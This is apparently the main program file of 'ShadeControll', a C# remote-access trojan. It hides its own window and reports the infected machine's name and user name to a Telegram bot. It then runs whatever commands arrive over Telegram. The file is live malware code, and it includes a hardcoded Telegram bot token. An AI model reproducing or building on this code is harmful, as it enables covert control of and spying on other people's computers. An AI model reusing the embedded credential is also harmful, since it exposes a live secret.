﻿using System;
using System.Threading;
using System.Collections.Generic;
using ShadeControll.Commands;
using Salaros.Configuration;
using System.IO;
using System.Globalization;

namespace ShadeControll
{
    class Program
    {
        public static TelegramClient telegramClient;
        public static ConfigParser configFile;
        public static readonly string configFileName = "config.cfg";

        static void Main()
        {
            // Preparing
            Ninja.Hide();
            configFile = GetConfig(configFileName);
            telegramClient = new TelegramClient("1774037430:AAHnjjeOUNvn-ZpyCCo_6mIhztp_GkagsVg");
            while(!telegramClient.Connect()) { Thread.Sleep(1000); }

            // First Run
            if(configFile.GetValue("info","first_run") == "true")
            {
                telegramClient.SendMessage("The instalation or update was successful 🤩 /version");
                configFile.SetValue("info", "first_run", "false");
                configFile.Save(configFileName);
            }

            // Welcome Message
            telegramClient.SendMessage(
                "ShadeControll is running now[" + configFile.GetValue("info","version") + "] \n" +
                "MachineName [" + Environment.MachineName + "] \n" +
                "AppID [" + configFile.GetValue("info","id") + "] \n" +
                "UserName [" + Environment.UserName + "] \n" +
                "/help " + configFile.GetValue("info","first_run")
                );
            telegramClient.NewMessage += Client_NewMessage;
            while (true) { Thread.Sleep(1000); }
        }

        // Lister Telegram Client Commands
        private static void Client_NewMessage(string message)
        {
            Cmd _cmd = new Cmd(message);
            foreach(Command cmd in Command.AvailableCommands)
            {
                if(cmd.Name == _cmd.Name) { cmd.Execute(_cmd.Args); }
            }
        }

        // Prepare Config File
        private static ConfigParser GetConfig(string file)
        {
            if(File.Exists(file))
            {
                return new ConfigParser(file);
            }
            else
            {
                File.WriteAllText(configFileName, ConfigFile.Default);
                return new ConfigParser(ConfigFile.Default, new ConfigParserSettings {
                    MultiLineValues = MultiLineValues.Simple | MultiLineValues.AllowValuelessKeys | MultiLineValues.QuoteDelimitedValues,
                    Culture = new CultureInfo("en-US")
                });
            }
        }
    }
}
